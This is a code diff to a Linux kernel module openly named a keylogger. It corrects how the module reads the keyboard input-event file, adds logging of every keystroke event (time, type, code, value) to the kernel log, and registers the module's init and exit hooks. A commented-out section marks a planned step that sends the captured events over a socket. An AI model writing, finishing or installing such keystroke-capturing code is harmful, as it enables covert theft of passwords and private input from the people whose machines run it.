@@ -29,13 +29,15 @@ static int __init keylogger_init(void) {
 
     // Read the keyboard event file
     while (1) {
-        ret = kernel_read(file, &offset, (char*)&ie, sizeof(struct input_event));      // Read the keyboard event file
+        ret = kernel_read(file, &ie, sizeof(struct input_event), &offset);          // Read the keyboard event file
         if (ret < 0) {                                                              // If the return value is negative
 
             printk(KERN_ALERT "Couldn't read keyboard-event file!\n");              // Print error message
             break;                                                                  // Break the loop
 
         }
+
+        printk(KERN_INFO "Time: %ld.%06ld\tType: %d\tCode: %d\tValue: %d\n", ie.time.tv_sec, ie.time.tv_usec, ie.type, ie.code, ie.value);     // Print the input event
 
         // Send the input event to socket
         /*
@@ -60,4 +62,8 @@ static void __exit keylogger_exit(void) {
     
 }
 
+module_init(keylogger_init);
+module_exit(keylogger_exit);
+
 MODULE_LICENSE("GPL");
+
